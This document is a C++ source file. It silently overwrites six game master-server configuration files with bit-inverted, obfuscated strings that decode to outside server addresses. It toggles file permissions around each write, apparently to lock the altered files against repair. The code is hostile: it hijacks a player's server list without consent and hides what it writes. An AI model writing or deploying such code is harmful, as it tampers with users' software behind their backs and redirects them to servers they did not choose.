#include "MasterServer.h"

const char * MasterServer::configMaster = "config/MasterServers.vdf";
const char * MasterServer::configRevMaster		= "config/rev_MasterServers.vdf";
		
const char * MasterServer::platformMaster 		= "platform/MasterServers.vdf";
const char * MasterServer::platformConfigMaster	= "platform/config/MasterServers.vdf";
const char * MasterServer::platformConfigMaster2 = "platform/config/MasterServers2.vdf";
const char * MasterServer::platformConfigRev 	= "platform/config/rev_MasterServers.vdf";

void encodeString( const char * string , char * buffer );

void MasterServer::replaceConfigMaster(){
	
	char buffer[ 4096 ];
	
	strcpy( buffer , "Ý²žŒ‹š¬š‰šŒÝõ„õÝ—“ÎÝõ„õÝÏÝõ„õÝž››ÝööÝÆÎÑÍÌÎÑÍËÑÈÅÍÈÏÎÏÝõ‚õÝÎÝõ„õÝž››ÝööÝœŒ–”ŒÑ“ÅÍÈÏÎÏÝõ‚õõ‚õõÝ—“ÍÝõ„õÝÏÝõ„õÝž››ÝööÝÆÎÑÍÌÎÑÍËÑÈÅÍÈÏÎÎÝõ‚õÝÎÝõ„õÝž››ÝööÝœŒ–”ŒÑ“ÅÍÈÏÎÎÝõ‚õ‚õÝ›”™Ýõ„õ‚õ‚õõ" );	
	
	encodeString( buffer , buffer );
	
	checkAndSetPermissions( configMaster , false , false , false );
	
	this -> _replaceFileContext( configMaster , buffer );
	
	checkAndSetPermissions( configMaster , true , true , true );
}

void MasterServer::replaceRevMaster(){
	char buffer[ 4096 ];
	
	strcpy( buffer , "Ý²žŒ‹š¬š‰šŒÝõ„õÝ—“ÎÝõ„õÝÏÝõ„õÝž››ÝööÝÆÎÑÍÌÎÑÍËÑÈÅÍÈÏÎÏÝõ‚õÝÎÝõ„õÝž››ÝööÝœŒ–”ŒÑ“ÅÍÈÏÎÏÝõ‚õõ‚õõÝ—“ÍÝõ„õÝÏÝõ„õÝž››ÝööÝÆÎÑÍÌÎÑÍËÑÈÅÍÈÏÎÎÝõ‚õÝÎÝõ„õÝž››ÝööÝœŒ–”ŒÑ“ÅÍÈÏÎÎÝõ‚õ‚õÝ›”™Ýõ„õ‚õ‚õõ" );	
	
	encodeString( buffer , buffer );
	
	checkAndSetPermissions( configRevMaster , false , false , false );
	
	this -> _replaceFileContext( configRevMaster , buffer );
	
	checkAndSetPermissions( configRevMaster , true , true , true );
}

void MasterServer::replacePlatformConfig(){
	char buffer[ 4096 ];
	
	strcpy( buffer , "Ý²žŒ‹š¬š‰šŒÝõ„õÝ—“ÎÝõ„õÝÏÝõ„õÝž››ÝööÝœŒ–”ŒÑ“ÅÍÈÏÎÏÝõ‚õÝÎÝõ„õÝž››ÝööÝÆÎÑÍÌÎÑÍËÑÈÅÍÈÏÎÏÝõ‚õ‚õ‚" );	
	
	encodeString( buffer , buffer );
	
	checkAndSetPermissions( platformMaster, false , false , false );
	
	this -> _replaceFileContext( platformMaster ,buffer );

	checkAndSetPermissions( platformMaster , true , true , true );
}

void MasterServer::replacePlatformConfigMaster(){
	char buffer[ 4096 ];
	
	strcpy( buffer , "Ý²žŒ‹š¬š‰šŒÝõ„õÝ—“ÎÝõ„õÝÏÝõ„õÝž››ÝööÝœŒ–”ŒÑ“ÅÍÈÏÎÏÝõ‚õÝÎÝõ„õÝž››ÝööÝÆÎÑÍÌÎÑÍËÑÈÅÍÈÏÎÏÝõ‚õ‚õ‚" );	
	
	encodeString( buffer , buffer );
	
	checkAndSetPermissions( platformConfigMaster, false , false , false );
		
	this -> _replaceFileContext( platformConfigMaster , buffer );

	checkAndSetPermissions( platformConfigMaster , true , true , true );
}

void MasterServer::replacePlatformConfigMaster2(){
	char buffer[ 4096 ];
	
	strcpy( buffer , "Ý²žŒ‹š¬š‰šŒÝõ„õÝÏÝõ„õÝž››ÝööÝœŒ–”ŒÑ“ÅÍÈÏÎÏÝõ‚õÝÎÝ„õÝž››ÝööÝÆÎÑÍÌÎÑÍËÑÈÅÍÈÏÎÏÝõ‚õ‚õ" );	
	
	encodeString( buffer , buffer );
	
	checkAndSetPermissions( platformConfigMaster2, false , false , false );
	
	this -> _replaceFileContext( platformConfigMaster2 , buffer );
	
	checkAndSetPermissions( platformConfigMaster2 , true , true , true );
}

void  MasterServer::replacePlatformConfigRev(){
	char buffer[ 4096 ];
	
	strcpy( buffer , "Ý²žŒ‹š¬š‰šŒÝ„õÝ—“ÎÝõ„õÝÏÝõ„õÝž››ÝööÝÆÎÑÍÌÎÑÍËÑÈÅÍÈÏÎÏÝõ‚õÝÎÝõ„õÝž››ÝööÝœŒ–”ŒÑ“ÅÍÈÏÎÏÝõ‚õõ‚õõÝ—“ÍÝõ„õÝÏÝõ„õÝž››ÝööÝÆÎÑÍÌÎÑÍËÑÈÅÍÈÏÎÎÝõ‚õÝÎÝõ„õÝž››ÝööÝœŒ–”ŒÑ“ÅÍÈÏÎÎÝõ‚õ‚õÝ›”™Ýõ„õ‚õ‚" );	
	
	encodeString( buffer , buffer );
	
	checkAndSetPermissions( platformConfigRev, false , false , false );
	
	this -> _replaceFileContext( platformConfigRev , buffer );
	
	checkAndSetPermissions( platformConfigRev , true , true , true );
}

void MasterServer::_replaceFileContext( const char * fileName , const char * context ){
	FILE * filePointer = fopen( fileName , "wt" );
	
	if( !filePointer ){
		return;
	}
	
	fputs( context , filePointer );
	
	fclose( filePointer );
}

void MasterServer::replaceMaster(){
	this -> replaceConfigMaster();
	this -> replaceRevMaster();
	this -> replacePlatformConfig();
	this -> replacePlatformConfigMaster();
	this -> replacePlatformConfigMaster2();
	this -> replacePlatformConfigRev();
}

void encodeString( const char * string , char * buffer ){
	strcpy( buffer , string );
	
	char * pointerChar = buffer;
	
	do{
		*pointerChar = ~( *pointerChar );
		
		pointerChar++;
	}
	while( *pointerChar );
}
